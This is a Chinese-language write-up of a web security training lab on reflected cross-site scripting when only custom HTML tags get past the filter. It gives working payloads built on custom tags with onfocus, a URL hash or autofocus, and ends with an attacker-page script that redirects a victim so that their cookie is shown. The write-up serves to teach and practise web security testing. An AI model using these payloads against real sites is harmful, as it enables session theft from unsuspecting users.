# 实验：在除自定义标签外所有标签均被阻止的 HTML 上下文中的反射型 XSS

本实验会阻止除自定义标签以外的所有 HTML 标签。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要注入一个自定义标签并自动弹窗显示 `document.cookie` 的内容。

## 步骤

探测
- 使用搜索功能，测试自定义标签
    ```http
    GET /?search=test<xss> HTTP/2
    ```

    - 响应
        ```html
        <h1>0 search results for 'test<xss>'</h1>
        ```
        - 自定义标签可注入

- 复制 portswigger 的 xss 速查表中自定义标签的可用属性到攻击器进行爆破
    ```http
    GET /?search=test<xss/爆破位置> HTTP/2
    ```
    - 发现所有属性均可用


攻击
- 尝试使用 hash 与聚焦
    `test<xss id=abc tabindex=1 onfocus=alert()>#abc`

    ```http
    GET /?search=test%3Cxss+id%3Dabc+onfocus%3Dalert%28%29%3E#abc HTTP/2
    ```
    - 注意此处的 `#` 不应被 URL 编码
    - 成功弹窗

- 尝试使用自动聚焦
    `test<xss tabindex=1 onfocus=alert() autofocus>`

    ```http
    GET /?search=%60test%3Cxss+tabindex%3D1+onfocus%3Dalert%28%29+autofocus%3E%60 HTTP/2
    ```
    - 成功弹窗

- 在攻击者页面设置载荷
    ```html
    <script>
        location="https://实验室地址/?search=test<xss tabindex=1 onfocus=alert(document.cookie) autofocus>"
    </script>
    ```
